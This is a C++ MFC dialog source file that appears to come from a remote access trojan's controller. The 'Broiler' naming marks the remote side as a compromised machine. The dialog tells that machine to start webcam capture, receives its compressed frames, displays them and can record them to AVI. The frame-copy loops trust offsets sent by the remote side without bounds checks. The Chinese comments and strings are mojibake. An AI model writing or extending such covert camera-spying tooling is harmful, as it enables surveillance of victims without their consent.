// VideoDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "VideoDlg.h"
#include "BroilerData.h"


// CVideoDlg �Ի���

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

CVideoDlg::CVideoDlg(CWnd* pParent /*=NULL*/,  SOCKET sock)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_socket = sock;
	m_pAviFile = NULL;
	m_pCompress = NULL;
	m_pUnCompress = NULL;
}

CVideoDlg::~CVideoDlg()
{
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_RECORDS, &CVideoDlg::OnBnClickedBtnRecords)
	ON_BN_CLICKED(IDC_BTN_RECORDE, &CVideoDlg::OnBnClickedBtnRecorde)
END_MESSAGE_MAP()


// CVideoDlg ��Ϣ�������
BOOL CVideoDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
 	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CVideoDlg::DlgInit()
{
	CString OnlineIP = _T("");

	SetWindowText(_T("[��Ƶ��׽] ")+OnlineIP);

	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_CAMERA), FALSE);	
	CenterWindow();	
	// TODO: Add extra initialization here
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1300001);
	int strPartDim[2]= {250,-1};
	m_wndStatusBar.SetParts(2,strPartDim);

	//create picture box
	m_PicBox.Create(NULL, NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_HSCROLL | WS_VSCROLL, CRect(0, 0, 1, 1), this, 0);
	CRect rc;
	GetClientRect(&rc);
	rc.bottom -= 50;
	m_PicBox.MoveWindow(&rc);
	m_PicBox.SetTipText(_T("���Ժ��豸���ڳ�ʼ������"));

	SendVideoStartMsg();
}

void CVideoDlg::StatusTextOut(int iPane,LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

void CVideoDlg::SendVideoStartMsg()
{
	char strMsg[] = "open";  //�����߳�
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_VIDEO_VIEW;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

DWORD CVideoDlg::RecvVideo(IN VIDEODATA_C tagVideoData) 
{
	switch(tagVideoData.Id)
	{
	case 0:   //ͷ��Ϣ
		{
			m_pBmpheader = (BITMAPINFO*)LocalAlloc(LPTR, tagVideoData.HeadSize);
			memcpy(m_pBmpheader, &tagVideoData.bmpinfo, tagVideoData.HeadSize);
			m_pCompress = new BYTE[tagVideoData.dwExtend2];    //ѹ����� //�����ڴ�ռ�
			m_pUnCompress = new BYTE[tagVideoData.dwExtend1];  //δѹ����
			memset(m_pCompress, 0, tagVideoData.dwExtend2);
		}
		break;
	case 1:  //λͼ����
		{
			//��������
			for(int i= tagVideoData.Begin, j = 0 ; j < SCREEN_BUF_SIZE; i++, j++)
			{
				m_pCompress[i] = tagVideoData.Data[j];
			}
		}
		break;
	case 2:  //���һ�θ�������
		{
			for(int i= tagVideoData.Begin, j=0; i<tagVideoData.Size; i++,j++)
			{
				m_pCompress[i] = tagVideoData.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("δ֪��ͼ������ID"),_T("��ʾ"),MB_OK);
			delete[] m_pCompress;
			LocalFree(m_pBmpheader);
			return 1;
		}
	}
	//�жϴ������Ժ��Ƿ������ʾͼ��
	if (tagVideoData.bShow)
	{
		DWORD lenthUncompress= tagVideoData.dwExtend1;  //δѹ����
		uncompress(m_pUnCompress,
			       &lenthUncompress,
				   m_pCompress,
				   tagVideoData.dwExtend2);  //��ѹ����
		//��ʾͼ��
		HBITMAP hBitmap = GetBitmapFromData(m_pBmpheader, m_pUnCompress);
		if(m_pAviFile != NULL)
		{
			m_pAviFile->AppendNewFrame(hBitmap);
		}
		m_PicBox.SetBitmap(hBitmap);

		delete [] m_pCompress;
		delete [] m_pUnCompress;
	}
	return 0;
}

void CVideoDlg::VideoStop()
{

}

HBITMAP CVideoDlg::GetBitmapFromData(LPBITMAPINFO lpBmpInfo, BYTE* pDibData)
{
	HBITMAP hBitmap;

	HDC hDC = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
	// ����DDBλͼ
	hBitmap = CreateDIBitmap(hDC,
		                     &lpBmpInfo->bmiHeader,
							 CBM_INIT,
							 pDibData,
							 lpBmpInfo,
							 DIB_RGB_COLORS);

	DeleteDC(hDC);
	return hBitmap;
}

//��ʼ¼��
void CVideoDlg::OnBnClickedBtnRecords()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CString strAVIFile,strAVIName;
	CFileDialog dlgFileOpen(FALSE, _T(".avi"), NULL, OFN_HIDEREADONLY, _T("AVI Files(*.avi)|*.avi||"));
	if (dlgFileOpen.DoModal() != IDOK)
	{
		return;
	}
	strAVIFile = dlgFileOpen.GetPathName();	
	strAVIName = dlgFileOpen.GetFileName();

	if(strAVIFile.IsEmpty())
	{
		MessageBox(_T("¼���ļ����Ʋ���Ϊ��,��ʼ¼��ʧ��"),_T("��ʼ¼��"),MB_ICONEXCLAMATION | MB_ICONERROR);
		return;
	}

	if(m_pAviFile != NULL)
	{
		delete m_pAviFile;
	}
	m_pAviFile = new CAviFile(strAVIFile, 0, 4);
	if (!m_pAviFile)
	{
		::MessageBox(this->m_hWnd, _T("�½���Ƶ¼���ļ�ʧ��"),_T("��ʼ¼��"), MB_ICONEXCLAMATION | MB_ICONERROR);
	}
	else
	{
		StatusTextOut(0,_T("¼��Ϊ�ļ�: %s"), strAVIName);
		GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(FALSE);
		GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(TRUE);
	}
}

//ֹͣ¼��
void CVideoDlg::OnBnClickedBtnRecorde()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(m_pAviFile != NULL)
	{
		delete m_pAviFile;
	}
	m_pAviFile = NULL;

	StatusTextOut(0 , _T(""));
	GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(FALSE);	
}

void CVideoDlg::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	char strMsg[] = "quit";   //�˳��߳�
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_VIDEO_VIEW;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //�����˳���Ϣ
	Sleep(30);
	DestroyWindow();
	delete this;
}

void CVideoDlg::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pVideoDlg = NULL;
}

